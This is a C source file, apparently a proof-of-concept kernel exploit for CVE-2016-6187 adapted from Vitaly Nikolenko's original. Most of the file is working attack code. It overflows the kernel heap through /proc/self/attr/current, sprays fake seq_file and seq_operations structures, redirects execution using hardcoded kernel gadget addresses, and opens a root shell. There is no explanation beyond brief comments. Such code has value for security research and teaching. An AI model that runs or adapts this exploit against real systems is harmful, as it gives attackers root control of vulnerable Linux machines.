/**
 * poc for CVE-2016-6187, originally written by Vitaly Nikolenko
 * modified by kylebot
 *
 * modified by kylebot
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <assert.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include "libexp.h"

#define CRASH_IP 0xffffffff81a0a73f

/******************************************************************/
/*************************AUTO GENERATED***************************/
#define _GNU_SOURCE
#ifndef va_start
#include <stdarg.h>
#endif
#ifndef assert
#include <assert.h>
#endif
#ifndef signal
#include <signal.h>
#endif
#ifndef sched_setaffinity
#include <sched.h>
#endif

// we need this because rcx may not be restored in the trampoline
// so it will crash during kernel-user switch
void get_shell(int signum) {
    printf("uid: %d\n", getuid());
    system("/bin/sh");
    while(1);
}

void __attribute__((constructor)) _ret2reg_init() {
    signal(SIGSEGV, get_shell);
}

unsigned long _args[6];
unsigned long _arg_num = 0;
void __trigger()
{

    __asm__(".intel_syntax noprefix;"
            "push rbp;"

            "mov rcx, %0;"
            "mov rdi, [rcx+8*0];"
            "mov rsi, [rcx+8*1];"
            "mov rdx, [rcx+8*2];"
            "mov r10, [rcx+8*3];"
            "mov r8, [rcx+8*4];"
            "mov r9, [rcx+8*5];"

                        "mov r12, 0xffffffff817503dd;"
                        "mov r13, 0xffffffff8244ab00;"
                        "mov r10, 0xffffffff810d0ad0;"
                        "mov r9, 0xffffffff81c00164;"

            "mov rax, 0;"
            "syscall;"
            "pop rbp;"
            ".att_syntax;"
            : : "r"(_args));
}

void _trigger(int num_args, ...)
{
    va_list ap;
    va_start(ap, num_args);
    for(int i=0; i<num_args; i++) {
        _args[_arg_num++] = va_arg(ap, unsigned long);
    }
    va_arg(ap, unsigned long);
    va_end(ap);

    __asm__(".intel_syntax noprefix;"
            "call __trigger;"
            ".att_syntax;");
    _arg_num = 0;
    if(getuid() == 0) get_shell(0);
}

#define NUMARGS(...)  (sizeof((unsigned long[]){__VA_ARGS__})/sizeof(unsigned long))
#define ret2reg_trigger(...) _trigger(NUMARGS(__VA_ARGS__), __VA_ARGS__ )
/*************************AUTO GENERATED***************************/
/******************************************************************/

struct seq_file {
	char hole1[0x40];
	char mutex[0x20];
	void* op;
	char hole2[0x18];
};

struct seq_operations {
	void* start;
	void* stop;
	void* next;
	int* show;
};

char payload[0x80];
struct seq_file *fake_seq_file;
struct seq_operations fake_ops;
int fd;

void setup_context()
{
	fd = open("/proc/self/attr/current", O_RDWR);
	if (fd == -1)
		error_out("trigger fd");
}

u64 _get_mem_size(void)
{
	FILE *f = fopen("/proc/meminfo", "r");
	char *line_buf = NULL;
	char *buf;
	size_t n;

	assert(f != NULL);

	if(getline(&line_buf, &n, f) < 0) {
		free(line_buf);
		goto out;
	}
	buf = strstr(line_buf, ":") + 1;
	fclose(f);
	return atoll(buf) * 1024;

out:
	puts("fail to read memory size");
	fclose(f);
	return -1;
}

void setup_payload()
{
	// use ret2dir to spray the fake fops
	fake_ops.start = (void *)CRASH_IP;
	u64 upper_limit = _get_mem_size() & (~0xfff);
	u64 kaddr = 0xffff880000000000 + upper_limit/4*3;
	kaddr &= 0xfffffffffffff000;
	printf("kaddr: %#llx\n", kaddr);
	for(int i=0;i<upper_limit/0x1000/4;i++) {
		void *addr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
		memcpy(addr, &fake_ops, sizeof(fake_ops));
	}

	// craft fake seq_file
	memset(payload, 'A', sizeof(payload));
	fake_seq_file = (struct seq_file *)(payload - 0x28);
	fake_seq_file->op = (void *)kaddr;
	// fake_seq_file->op = 0x4141414141414141;
	memset(fake_seq_file->mutex, 0, 0x20);
}

void exploit()
{
	char buf[0x80];

	set_cpu(0);

	setup_context();

	// fill the buffer so the vulnerability can be triggered
	memset(buf, 'A', sizeof(buf));

	// maximize time slice
	ts_fence();

	// defragmentation
	defragment(0x80, 320);

	// trigger vulnerability
	write(fd, buf, 0x80);

	// fill a hole
	defragment(0x80, 1);

	// open proc file to allocate seq_file
	int seq_fd = open("/proc/buddyinfo", O_RDONLY);
	if (unlikely(seq_fd == -1))
		error_out("seq_fd");

	// overwrite seq_file
	struct msg_spray_t *spray = msg_spray(payload, 0x40, 0x100);

	// trigger crash
	// read(seq_fd, buf, 4);
	ret2reg_trigger(seq_fd, buf, 4);

	// clean up
	msg_spray_clean(spray);
}

int main()
{
	set_cpu(0);
	setup_payload();
	while(1) {
		usleep(10);
		if(!clean_fork()) {
			exploit();
			exit(0);
		}
		wait(NULL);
	}
}
